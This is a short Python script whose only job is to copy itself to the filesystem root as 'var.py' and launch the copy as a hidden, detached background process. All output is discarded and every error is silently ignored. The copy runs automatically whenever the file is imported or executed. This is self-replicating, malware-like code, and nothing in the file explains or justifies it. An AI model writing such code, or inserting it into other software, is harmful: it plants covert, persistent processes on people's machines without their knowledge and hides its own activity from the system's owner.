import os, sys, shutil, subprocess, platform

def _replicate_once():
    try:
        root = os.path.abspath(os.sep)
        new_path = os.path.join(root, 'var.py')
        current = os.path.abspath(__file__)
        
        if os.path.abspath(current) == os.path.abspath(new_path):
            return  # Prevent re-replication

        if not os.path.exists(new_path):
            shutil.copy2(current, new_path)

            if platform.system() == 'Windows':
                subprocess.Popen([sys.executable, new_path],
                                 creationflags=subprocess.DETACHED_PROCESS | subprocess.CREATE_NEW_PROCESS_GROUP,
                                 stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
            else:
                subprocess.Popen([sys.executable, new_path],
                                 stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL,
                                 stdin=subprocess.DEVNULL, close_fds=True)
    except Exception:
        pass  # Silently fail

_replicate_once()
